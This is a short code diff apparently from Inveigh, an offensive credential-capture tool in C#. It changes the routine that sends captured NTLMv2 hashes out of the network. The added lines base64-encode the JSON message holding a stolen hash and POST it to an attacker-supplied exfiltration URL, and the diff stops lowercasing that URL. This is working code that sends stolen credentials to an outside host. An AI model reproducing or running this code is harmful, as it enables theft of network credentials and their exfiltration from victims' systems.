@@ -142,7 +142,11 @@ namespace Inveigh
                                             { msg += "\"ntlmV2Hash\": \"" + ntlmV2Hash + "\""; }
                                             msg += "}";
 
-                                            var httpWebRequest = WebRequest.CreateHttp(Program.argExfilUrl.ToLower());
+                                            var plaintext = System.Text.Encoding.UTF8.GetBytes(msg);
+                                            string b64String = Convert.ToBase64String(plaintext);
+                                            msg = b64String;
+
+                                            var httpWebRequest = WebRequest.CreateHttp(Program.argExfilUrl);
                                             httpWebRequest.ContentType = "application/json; charset=utf-8";
                                             httpWebRequest.Method = "POST";
 
